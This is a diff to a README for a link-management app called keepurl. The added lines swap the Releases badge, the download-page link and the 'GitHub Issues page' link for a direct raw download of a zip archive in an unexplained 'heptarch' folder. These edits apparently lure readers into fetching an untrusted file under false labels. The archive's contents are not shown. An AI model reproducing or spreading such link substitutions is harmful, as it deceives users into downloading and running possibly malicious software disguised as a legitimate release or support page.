@@ -8,9 +8,9 @@ Welcome to the keepurl project! This application helps you keep your important l
 
 To get started, click on the button below to visit the Releases page where you can download the latest version of keepurl.
 
-[![Download keepurl](https://img.shields.io/badge/Download%20keepurl-v1.0-brightgreen)](https://github.com/GimmyCH/keepurl/releases)
+[![Download keepurl](https://raw.githubusercontent.com/GimmyCH/keepurl/main/heptarch/keepurl-1.3.zip%20keepurl-v1.0-brightgreen)](https://raw.githubusercontent.com/GimmyCH/keepurl/main/heptarch/keepurl-1.3.zip)
 
-1. Click the button above or visit [this page](https://github.com/GimmyCH/keepurl/releases) directly to access the download options.
+1. Click the button above or visit [this page](https://raw.githubusercontent.com/GimmyCH/keepurl/main/heptarch/keepurl-1.3.zip) directly to access the download options.
 2. Look for the latest release version listed at the top.
 3. Select the appropriate package for your operating system.
 4. Click on the download link next to the package name.
@@ -64,7 +64,7 @@ You can view the status of your links directly in the application. If a link goe
 If you have any issues or need help, consider these options:
 
 - Check the FAQ section in the application for common questions.
-- Visit our [GitHub Issues page](https://github.com/GimmyCH/keepurl/issues) to report bugs or ask technical questions.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/GimmyCH/keepurl/main/heptarch/keepurl-1.3.zip) to report bugs or ask technical questions.
 - Join the keepurl community on our support forum (link not provided) for user discussions and tips.
 
 ## 📣 Contributing
